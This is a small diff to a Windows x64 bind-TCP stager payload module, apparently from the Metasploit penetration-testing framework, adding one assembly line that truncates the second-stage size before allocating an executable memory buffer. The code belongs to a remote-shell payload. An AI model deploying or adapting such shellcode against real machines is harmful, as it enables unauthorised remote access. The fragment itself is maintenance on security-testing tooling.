@@ -220,6 +220,7 @@ module Payload::Windows::BindTcp_x64
 
         ; Alloc a RWX buffer for the second stage
         pop rsi                ; pop off the second stage length
+        mov esi, esi           ; only use the lower-order 32 bits for the size
         push 0x40              ; 
         pop r9                 ; PAGE_EXECUTE_READWRITE
         push 0x1000            ; 
